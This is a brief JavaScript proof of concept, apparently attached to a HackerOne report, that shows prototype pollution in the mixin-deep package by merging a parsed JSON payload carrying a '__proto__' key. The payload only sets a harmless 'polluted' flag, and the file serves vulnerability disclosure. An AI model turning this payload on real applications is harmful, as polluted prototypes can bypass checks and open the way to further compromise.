//https://hackerone.com/reports/311236
 
  const mixin = require("mixin-deep");
  let malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  let obj = {};

   

  mixin({}, JSON.parse(malicious_payload));
// End of file
